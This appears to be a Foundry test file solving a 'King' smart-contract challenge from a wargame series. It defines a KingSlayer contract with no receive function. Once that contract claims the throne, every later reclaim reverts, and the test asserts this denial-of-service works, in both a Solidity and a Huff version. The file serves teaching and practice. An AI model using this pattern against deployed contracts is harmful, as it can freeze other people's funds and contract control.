// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.15;

import "foundry-huff/HuffDeployer.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";

import {King} from "src/Challenge9-king/Puzzle.sol";

contract Challenge9Test is Test {
    King public puzzle;
    address player = makeAddr("player");

    /// @dev Setup the testing environment.
    function setUp() public {
        // lets imagine that the password is a random value
        puzzle = new King{value:1 }();
        
    }

    function testSimpleHack() public {
        assertEq(puzzle._king(), address(this));

        KingSlayer ks = new KingSlayer(address(puzzle));
        ks.claimThrone{value: puzzle.prize() + 1}();

        assertFalse(puzzle._king() == address(this));
        
        // recover onweship
        uint256 newVal = puzzle.prize() + 1;
        vm.expectRevert();
        address(puzzle).call{value: newVal}("");
    }


    function testHackHuff() public {
        assertEq(puzzle._king(), address(this));

        KingSlayer ks = KingSlayer(HuffDeployer.config()
            .with_addr_constant("PUZZLE", address(puzzle))
            .deploy("Challenge9-king/Hack"));
        ks.claimThrone{value: puzzle.prize() + 1}();
        
        assertFalse(puzzle._king() == address(this));
        
        // recover onweship
        uint256 newVal = puzzle.prize() + 1;
        vm.expectRevert();
        address(puzzle).call{value: newVal}("");
    }
    
    receive() external payable {

    }
}

contract KingSlayer {
    address immutable puzzle;
    constructor(address _puzzle) {
        puzzle = _puzzle;
    }

    function claimThrone() external payable {
        puzzle.call{value: msg.value}("");
    }

    // no receive implemented, will always revert
}